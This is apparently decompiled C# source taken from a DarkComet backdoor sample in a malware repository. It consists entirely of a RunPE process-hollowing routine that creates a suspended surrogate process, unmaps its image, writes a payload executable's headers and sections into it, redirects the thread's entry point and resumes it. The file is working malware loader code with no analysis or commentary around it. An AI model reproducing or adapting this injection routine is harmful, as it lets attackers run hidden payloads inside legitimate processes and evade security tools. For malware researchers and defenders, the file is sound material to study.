// Decompiled with JetBrains decompiler
// Type: PE32
// Assembly: Farmdaten by Missiont0pwn, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 74DA0A5F-E4BD-42E2-B8F4-246A8CD298CF
// Assembly location: C:\Users\Administrateur\Desktop\Virusshare-00005-msil\Backdoor.Win32.DarkKomet.hcoa-f58c24dfd47cf948debeec7d4cba92bd016a7e322864fb363f25e9b489bbb9b9.exe

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Runtime.InteropServices;
using System.Text;

public class PE32
{
  private static readonly int[] prot = new int[8]
  {
    1,
    16,
    2,
    32,
    4,
    64,
    4,
    64
  };

  [DllImport("kernel32", CharSet = CharSet.Ansi, SetLastError = true)]
  public static extern IntPtr LoadLibraryA([MarshalAs(UnmanagedType.VBByRefStr)] ref string name);

  [DllImport("kernel32", CharSet = CharSet.Ansi, SetLastError = true)]
  public static extern IntPtr GetProcAddress(IntPtr handle, [MarshalAs(UnmanagedType.VBByRefStr)] ref string name);

  public static T CreateAPI<T>(string name, string method) => (T) Marshal.GetDelegateForFunctionPointer(PE32.GetProcAddress(PE32.LoadLibraryA(ref name), ref method), typeof (T));

  [DllImport("kernel32")]
  [return: MarshalAs(UnmanagedType.Bool)]
  public static extern bool CreateProcess(
    string appName,
    StringBuilder commandLine,
    IntPtr procAttr,
    IntPtr thrAttr,
    [MarshalAs(UnmanagedType.Bool)] bool inherit,
    int creation,
    IntPtr env,
    string curDir,
    byte[] sInfo,
    IntPtr[] pInfo);

  public static object RunPE(byte[] bytes, string surrogateProcess)
  {
    PE32.a api1 = PE32.CreateAPI<PE32.a>("kernel32", "GetThreadContext");
    PE32.b api2 = PE32.CreateAPI<PE32.b>("kernel32", "WriteProcessMemory");
    PE32.c api3 = PE32.CreateAPI<PE32.c>("ntdll", "NtUnmapViewOfSection");
    PE32.d api4 = PE32.CreateAPI<PE32.d>("kernel32", "ReadProcessMemory");
    PE32.f api5 = PE32.CreateAPI<PE32.f>("kernel32", "ResumeThread");
    PE32.g api6 = PE32.CreateAPI<PE32.g>("kernel32", "SetThreadContext");
    PE32.h api7 = PE32.CreateAPI<PE32.h>("kernel32", "VirtualAllocEx");
    PE32.CreateAPI<PE32.i>("kernel32", "VirtualProtectEx");
    object obj;
    try
    {
      IntPtr zero1 = IntPtr.Zero;
      IntPtr[] pInfo = new IntPtr[4];
      byte[] sInfo = new byte[68];
      int int32 = BitConverter.ToInt32(bytes, 60);
      int int16 = (int) BitConverter.ToInt16(bytes, checked (int32 + 6));
      IntPtr num1 = new IntPtr(BitConverter.ToInt32(bytes, checked (int32 + 84)));
      if (PE32.CreateProcess((string) null, new StringBuilder(surrogateProcess), zero1, zero1, false, 4, zero1, (string) null, sInfo, pInfo))
      {
        uint[] ctxt = new uint[179];
        ctxt[0] = 65538U;
        if (api1(pInfo[1], ctxt))
        {
          IntPtr baseAddr1 = new IntPtr(checked ((long) ctxt[41] + 8L));
          IntPtr zero2 = IntPtr.Zero;
          IntPtr bufrSize = new IntPtr(4);
          IntPtr zero3 = IntPtr.Zero;
          if (api4(pInfo[0], baseAddr1, ref zero2, (IntPtr) (int) bufrSize, ref zero3) && api3(pInfo[0], zero2) == 0U)
          {
            IntPtr addr = new IntPtr(BitConverter.ToInt32(bytes, checked (int32 + 52)));
            IntPtr size1 = new IntPtr(BitConverter.ToInt32(bytes, checked (int32 + 80)));
            IntPtr num2 = api7(pInfo[0], addr, size1, 12288, 64);
            PE32.b b1 = api2;
            IntPtr hProc1 = pInfo[0];
            IntPtr baseAddr2 = num2;
            byte[] buff1 = bytes;
            IntPtr size2 = (IntPtr) (long) checked ((uint) (int) num1);
            int num3;
            IntPtr num4 = (IntPtr) num3;
            ref IntPtr local1 = ref num4;
            int num5 = b1(hProc1, baseAddr2, buff1, size2, ref local1) ? 1 : 0;
            int num6 = (int) num4;
            int num7 = checked (int16 - 1);
            int num8 = 0;
            while (num8 <= num7)
            {
              int[] dst1 = new int[10];
              Buffer.BlockCopy((Array) bytes, checked (int32 + 248 + num8 * 40), (Array) dst1, 0, 40);
              byte[] dst2 = new byte[checked (dst1[4] - 1 + 1)];
              Buffer.BlockCopy((Array) bytes, dst1[5], (Array) dst2, 0, dst2.Length);
              size1 = new IntPtr(checked (num2.ToInt32() + dst1[3]));
              addr = new IntPtr(dst2.Length);
              PE32.b b2 = api2;
              IntPtr hProc2 = pInfo[0];
              IntPtr baseAddr3 = size1;
              byte[] buff2 = dst2;
              IntPtr size3 = (IntPtr) (long) checked ((uint) (int) addr);
              IntPtr num9 = (IntPtr) num6;
              ref IntPtr local2 = ref num9;
              int num10 = b2(hProc2, baseAddr3, buff2, size3, ref local2) ? 1 : 0;
              num6 = (int) num9;
              checked { ++num8; }
            }
            size1 = new IntPtr(checked ((long) ctxt[41] + 8L));
            addr = new IntPtr(4);
            PE32.b b3 = api2;
            IntPtr hProc3 = pInfo[0];
            IntPtr baseAddr4 = size1;
            byte[] bytes1 = BitConverter.GetBytes(num2.ToInt32());
            IntPtr size4 = (IntPtr) (long) checked ((uint) (int) addr);
            IntPtr num11 = (IntPtr) num6;
            ref IntPtr local3 = ref num11;
            int num12 = b3(hProc3, baseAddr4, bytes1, size4, ref local3) ? 1 : 0;
            num3 = (int) num11;
            ctxt[44] = checked ((uint) (num2.ToInt32() + BitConverter.ToInt32(bytes, int32 + 40)));
            int num13 = api6(pInfo[1], ctxt) ? 1 : 0;
          }
        }
        int num14 = api5(pInfo[1]);
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      obj = (object) false;
      ProjectData.ClearProjectError();
      goto label_11;
    }
    obj = (object) true;
label_11:
    return obj;
  }

  [return: MarshalAs(UnmanagedType.Bool)]
  public delegate bool a(IntPtr hThr, uint[] ctxt);

  [return: MarshalAs(UnmanagedType.Bool)]
  public delegate bool b(
    IntPtr hProc,
    IntPtr baseAddr,
    byte[] buff,
    IntPtr size,
    ref IntPtr numRead);

  public delegate uint c(IntPtr hProc, IntPtr baseAddr);

  [return: MarshalAs(UnmanagedType.Bool)]
  public delegate bool d(
    IntPtr hProc,
    IntPtr baseAddr,
    ref IntPtr bufr,
    IntPtr bufrSize,
    ref IntPtr numRead);

  public delegate int f(IntPtr hThr);

  [return: MarshalAs(UnmanagedType.Bool)]
  public delegate bool g(IntPtr hThr, uint[] ctxt);

  public delegate IntPtr h(IntPtr hProc, IntPtr addr, IntPtr size, int allocType, int prot);

  [return: MarshalAs(UnmanagedType.Bool)]
  public delegate bool i(IntPtr hProc, IntPtr addr, IntPtr size, int newProt, ref int oldProt);
}
